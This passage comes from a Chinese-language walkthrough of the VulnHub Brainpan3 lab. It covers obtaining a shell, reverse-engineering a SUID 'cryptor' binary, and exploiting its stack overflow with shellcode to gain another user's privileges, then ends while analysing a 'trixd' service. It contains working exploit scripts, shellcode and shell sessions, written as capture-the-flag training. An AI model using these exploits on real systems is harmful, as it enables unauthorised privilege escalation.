0 #&#x27;</span></span><br><span class="line">    <span class="comment"># send payload report</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Sending payload report&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    s.sendrecv( payload )</span><br><span class="line">    <span class="comment"># interactive shell?</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Dropping into shell&#x27;</span></span><br><span class="line">    s.send(<span class="string">&#x27;python -c &quot;import pty;pty.spawn(\&#x27;</span>/bin/bash\<span class="string">&#x27;)&quot;&#x27;</span>)</span><br><span class="line">    s.interact()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后执行漏洞利用程序为anansi用户获取了一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python report.py </span></span><br><span class="line">[+] Leak access code</span><br><span class="line">[+] Access code leaked: 2602</span><br><span class="line">[+] Enabling report feature</span><br><span class="line">[+] Sending payload report</span><br><span class="line">[+] Dropping into shell</span><br><span class="line">anansi@brainpan3:/$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ ls</span><br><span class="line">ls</span><br><span class="line">bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz</span><br><span class="line">boot  home        lib             mnt    root  srv   usr  vmlinuz.old</span><br><span class="line">dev   initrd.img  lost+found      opt    run   sys   var</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">anansi@brainpan3:/home$ ls</span><br><span class="line">ls</span><br><span class="line">anansi  puck  reynard</span><br><span class="line">anansi@brainpan3:/home$ <span class="built_in">cd</span> anansi</span><br><span class="line"><span class="built_in">cd</span> anansi</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ cat lapinblanc.txt</span><br><span class="line">cat lapinblanc.txt</span><br><span class="line"></span><br><span class="line">                     _       _</span><br><span class="line">                    / \     / \</span><br><span class="line">                   &#123;   &#125;   &#123;   &#125;</span><br><span class="line">                   &#123;   &#123;   &#125;   &#125;</span><br><span class="line">                    \   \ /   /</span><br><span class="line">                     \   Y   /</span><br><span class="line">                     .-<span class="string">&quot;`&quot;</span>`<span class="string">&quot;-.</span></span><br><span class="line"><span class="string">                   ,`         `.</span></span><br><span class="line"><span class="string">                  /             \</span></span><br><span class="line"><span class="string">                 /               \</span></span><br><span class="line"><span class="string">                &#123;     ;&quot;</span><span class="string">&quot;;,       &#125;</span></span><br><span class="line"><span class="string">                &#123;  /&quot;</span>;`<span class="string">&#x27;`,;       &#125;</span></span><br><span class="line"><span class="string">                 \&#123;  ;`,&#x27;</span>`;.     /</span><br><span class="line">                  &#123;  &#125;`<span class="string">&quot;&quot;</span>`  &#125;   /&#125;</span><br><span class="line">                  &#123;  &#125;      &#123;  //  f o l l o w</span><br><span class="line">                  &#123;||&#125;      &#123;  /       m e</span><br><span class="line">                  `<span class="string">&quot;&#x27;       `&quot;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub202.jpg"></p>
<h3 id="reynard"><a href="#reynard" class="headerlink" title="reynard"></a>reynard</h3><p>在box上寻找时，发现reynard文件夹是可读的，并且在“/private/”文件夹中具有SUID可执行文件和加密文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/reynard/private$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwx--- 2 reynard webdev  4.0K Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 3 reynard reynard 4.0K Jun 10  2015 ..</span><br><span class="line">-rwsr-xr-x 1 reynard reynard 5.5K May 19  2015 cryptor</span><br><span class="line">-r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc</span><br><span class="line">anansi@brainpan3:/home/reynard/private$ ./cryptor</span><br><span class="line">./cryptor</span><br><span class="line">Usage: ./cryptor file key</span><br></pre></td></tr></table></figure>

<p>将两个文件都下载到了本地计算机，并开始分析cryptor可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  cryptor  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 ...</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:39] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:48] <span class="string">&quot;GET /cryptor HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:46:07] <span class="string">&quot;GET /lapinblanc.txt HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub203.jpg"></p>
<p>下面是它的c语言伪代码</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int a1, char **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_80485ED(a2[1], a2[2]);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s file key\n&quot;</span>, *a2);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_80485ED</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_80485ED(char *src, char *nptr)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // eax</span><br><span class="line">  int v3; // ebx</span><br><span class="line">  int v4; // eax</span><br><span class="line">  char s[100]; // [esp+Ch] [ebp-78h]</span><br><span class="line">  int v7; // [esp+70h] [ebp-14h]</span><br><span class="line">  FILE *stream; // [esp+74h] [ebp-10h]</span><br><span class="line">  FILE *v9; // [esp+78h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  memset(dest, 0, 0x64u);</span><br><span class="line">  memset(s, 0, 0x64u);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(src) &lt;= 0x74 )</span><br><span class="line">    strcpy(s, src);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strncpy(s, src, 0x5Au);</span><br><span class="line">  v2 = &amp;s[strlen(s)];</span><br><span class="line">  *(_DWORD *)v2 = 1668179246;</span><br><span class="line">  v2[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] saving to %s\n&quot;</span>, s);</span><br><span class="line">  strcpy(dest, nptr);</span><br><span class="line">  v9 = fopen(src, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( stream = fopen(s, <span class="string">&quot;w&quot;</span>); ; fputc(v4 ^ v3, stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = fgetc(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v7 == -1 )</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">      v3 = (char)v7;</span><br><span class="line">      v4 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    fclose(v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从main函数开始，可以看到它将2个参数filename和key传递给cryptFile函数。在此函数中，它将对给定的文件名进行奇怪的长度检查，如果长度小于或等于116个字符，则会将完整文件名复制到100字节的pOutFilename缓冲区中，从而导致16字节的溢出。现在这还不足以溢出该函数的返回地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stack layout</span><br><span class="line">-00000078 pOutFile        db 100 dup(?)</span><br><span class="line">-00000014 DataByte        dd ?</span><br><span class="line">-00000010 fsin            dd ?                    ; offset</span><br><span class="line">-0000000C fsout           dd ?                    ; offset</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 pFile           dd ?                    ; offset</span><br><span class="line">+0000000C pKey            dd ?                    ; offset</span><br></pre></td></tr></table></figure>

<p>但是，从cryptFile返回并离开main函数时，会发生有趣的事情。由于主要功能以leave指令退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:08048786                 call    sub_80485ED</span><br><span class="line">.text:0804878B                 mov     eax, 0</span><br><span class="line">.text:08048790</span><br><span class="line">.text:08048790 locret_8048790:                         ; CODE XREF: main+26↑j</span><br><span class="line">.text:08048790                 leave</span><br><span class="line">.text:08048791                 retn</span><br></pre></td></tr></table></figure>

<p>leave说明与以下内容相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>

<p>它有效地还原了堆栈指针，现在，在leave指令上放置一个断点并以116个字符的文件名启动可执行文件时，我们可以看到发生了什么</p>
<p>(gdb中调试的效果)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0xbffff400 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">ESP: 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048790 (leave)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048783:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">=&gt; 0x8048790:    leave  </span><br><span class="line">   0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff484 --&gt; 0xbffff711 --&gt; 0x53530041 (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">0008| 0xbffff488 --&gt; 0xbffff508 --&gt; 0x0 </span><br><span class="line">0012| 0xbffff48c --&gt; 0xb7e6fe46 (:    mov    DWORD PTR [esp],eax)</span><br><span class="line">0016| 0xbffff490 --&gt; 0x3 </span><br><span class="line">0020| 0xbffff494 --&gt; 0xbffff534 --&gt; 0xbffff686 (<span class="string">&quot;/root/vulnhub/brainpan3/cryptor&quot;</span>)</span><br><span class="line">0024| 0xbffff498 --&gt; 0xbffff544 --&gt; 0xbffff713 (<span class="string">&quot;SSH_AGENT_PID=4019&quot;</span>)</span><br><span class="line">0028| 0xbffff49c --&gt; 0xb7fdd860 --&gt; 0xb7e59000 --&gt; 0x464c457f </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048790 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>EBP（0xbffff400）指向文件名缓冲区，并在执行成为ESP的离开指令时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048791 (ret)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">   0x8048790:    leave  </span><br><span class="line">=&gt; 0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">   0x8048798:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048791 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>最后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff424 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x41414141 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>那么该如何利用呢？请记住，密钥存储在全局缓冲区中，似乎cryptor是用可执行的堆栈和内存编译的，因此可以将Shellcode放在密钥缓冲区中，并在文件名缓冲区溢出中使用以返回该Shellcode来执行该Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploit:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line">__bss_key = 0x0804a080</span><br><span class="line">argFile = 29 * p(__bss_key)</span><br><span class="line">argKey = shellcode</span><br><span class="line"><span class="built_in">print</span> argFile + <span class="string">&#x27; &#x27;</span> + argKey</span><br></pre></td></tr></table></figure>

<p>执行漏洞利用程序时，它并不总是生效，只需多执行几次，直到它生效为止</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/root/vulnhub/brainpan3</span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux kali 5.4.0-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bofh  cryptor  cryptthis.py  poc.py  report  report.py  shell  test.py</span><br></pre></td></tr></table></figure>

<p>放在brainpan3上面运行poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;&lt;L&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27; &#x27; + argKeyecho &quot;</span>import struct</span><br><span class="line">&gt; </span><br><span class="line">&gt; def p(v):</span><br><span class="line">&gt;     <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line">&gt; </span><br><span class="line">&lt;\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;   </span></span><br><span class="line"><span class="string">&gt; __bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">&gt; argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">&gt; argKey = shellcode</span></span><br><span class="line"><span class="string">&gt; &quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey&quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptthis.py  vjGSL5d  vtSHi56</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cat cryptthis.py</span></span><br><span class="line"><span class="string">cat cryptthis.py</span></span><br><span class="line"><span class="string">import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;</span>&lt;L<span class="string">&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ python cryptthis.py</span></span><br><span class="line"><span class="string">python cryptthis.py</span></span><br><span class="line"><span class="string">����������������������������� 1����</span></span><br><span class="line"><span class="string">                                   Qh//shh/bin��</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cd /home</span></span><br><span class="line"><span class="string">cd /home</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">anansi  puck  reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd renard</span></span><br><span class="line"><span class="string">cd renard</span></span><br><span class="line"><span class="string">bash: cd: renard: No such file or directory</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd reynard</span></span><br><span class="line"><span class="string">cd reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ cd private</span></span><br><span class="line"><span class="string">cd private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptor  sekret.txt.enc</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">[+] saving to �����������������������������.enc</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">reynard</span></span><br></pre></td></tr></table></figure>

<p>现在得到了reynard用户的权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub204.jpg"></p>
<h3 id="Puck"><a href="#Puck" class="headerlink" title="Puck"></a>Puck</h3><p>我花了点时间弄清楚如何升级到puck用户的权限，当执行netstat时，注意到端口7075上有一个本地列出的服务，当连接到它时，出现以下文本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc 127.0.0.1 7075</span><br><span class="line">nc 127.0.0.1 7075</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>经过更多搜索之后，在/usr/local/sbin文件夹中找到了与此服务相关的trixd可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line">$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 40K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 26  2015 .</span><br><span class="line">drwxr-xr-x 10 root root 4.0K May 19  2015 ..</span><br><span class="line">-rwxr-xr-x  1 root root  17K May 26  2015 brainpan3</span><br><span class="line">-rwxr-xr-x  1 root root 7.5K May 20  2015 trixd</span><br><span class="line">-rwxr-xr-x  1 root root  343 May 21  2015 www</span><br></pre></td></tr></table></figure>

<p>将文件复制到本地计算机以进行分析</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // eax</span><br><span class="line">  int v2; // ebx</span><br><span class="line">  int v4; // ST1C_4</span><br><span class="line">  int v5; // ST1C_4</span><br><span class="line">  struct timeval timeout; // [esp+24h] [ebp-94h]</span><br><span class="line">  struct <span class="built_in">stat</span> stat_buf; // [esp+2Ch] [ebp-8Ch]</span><br><span class="line">  int buf; // [esp+84h] [ebp-34h]</span><br><span class="line">  int v9; // [esp+88h] [ebp-30h]</span><br><span class="line">  int v10; // [esp+8Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp+90h] [ebp-28h]</span><br><span class="line">  int v12; // [esp+94h] [ebp-24h]</span><br><span class="line">  int s1; // [esp+98h] [ebp-20h]</span><br><span class="line">  int v14; // [esp+9Ch] [ebp-1Ch]</span><br><span class="line">  int v15; // [esp+A0h] [ebp-18h]</span><br><span class="line">  int v16; // [esp+A4h] [ebp-14h]</span><br><span class="line">  int v17; // [esp+A8h] [ebp-10h]</span><br><span class="line">  unsigned int v18; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v18 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(0, 0, 1, 0) &lt; 0 )</span><br><span class="line">    <span class="built_in">return</span> -1;</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  timeout.tv_usec = 1;</span><br><span class="line">  buf = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  s1 = 0;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  __lxstat(3, <span class="string">&quot;/mnt/usb/key.txt&quot;</span>, &amp;stat_buf);</span><br><span class="line">  <span class="keyword">if</span> ( (stat_buf.st_mode &amp; 0xF000) == 40960 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = -1;</span><br><span class="line">    puts(<span class="string">&quot;Key file is compromised.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    select(1, 0, 0, 0, &amp;timeout);</span><br><span class="line">    v0 = open(<span class="string">&quot;/home/puck/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v0;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v0 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v0, &amp;buf, 0x13u);</span><br><span class="line">    v1 = open(<span class="string">&quot;/mnt/usb/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v1;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v1 = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v1, &amp;s1, 0x13u);</span><br><span class="line">    v2 = strcmp((const char *)&amp;s1, (const char 